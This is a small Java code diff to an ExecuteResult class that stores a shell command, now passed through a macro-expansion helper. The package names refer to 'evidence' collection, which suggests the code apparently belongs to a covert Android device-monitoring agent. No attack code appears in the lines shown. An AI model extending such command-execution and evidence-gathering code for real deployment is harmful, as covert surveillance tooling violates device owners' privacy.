@@ -5,6 +5,7 @@ import java.util.ArrayList;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
+import com.android.deviceinfo.file.Directory;
 
 public class ExecuteResult {
 	private static final String TAG = "ExecuteResult";
@@ -15,7 +16,7 @@ public class ExecuteResult {
 	public final String executionLine;
 
 	public ExecuteResult(String cmd) {
-		executionLine = cmd;
+		executionLine = Directory.expandMacro(cmd);
 	}
 
 	public String getStdout() {
